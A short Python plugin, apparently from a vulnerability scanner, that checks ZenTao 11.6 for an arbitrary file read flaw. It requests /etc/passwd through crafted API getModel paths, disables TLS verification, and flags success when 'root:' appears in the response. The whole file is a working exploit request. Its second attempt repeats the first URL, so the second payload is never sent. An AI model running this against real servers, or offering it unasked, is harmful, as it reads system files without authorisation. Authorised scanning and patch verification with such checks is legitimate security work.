#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '禅道 11.6 Api getModel api getMethod filePath 任意文件读取漏洞',

      'level'     :   'medium',
      'FOFA'      :   '',
      'author'    :   'ppxfx',
      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  targets = ['/api-getModel-file-parseCSV-fileName=/etc/passwd','/api-getModel-api-getMethod-filePath=/etc/passwd/1']
  url1 = url + targets[0]
  url2 = url + targets[1]
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:',res.text,re.S):
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
  except:
    pass
  try:
    resp=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if resp.status_code == 200 and re.search(r'root:',resp.text,re.S):
      resp.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret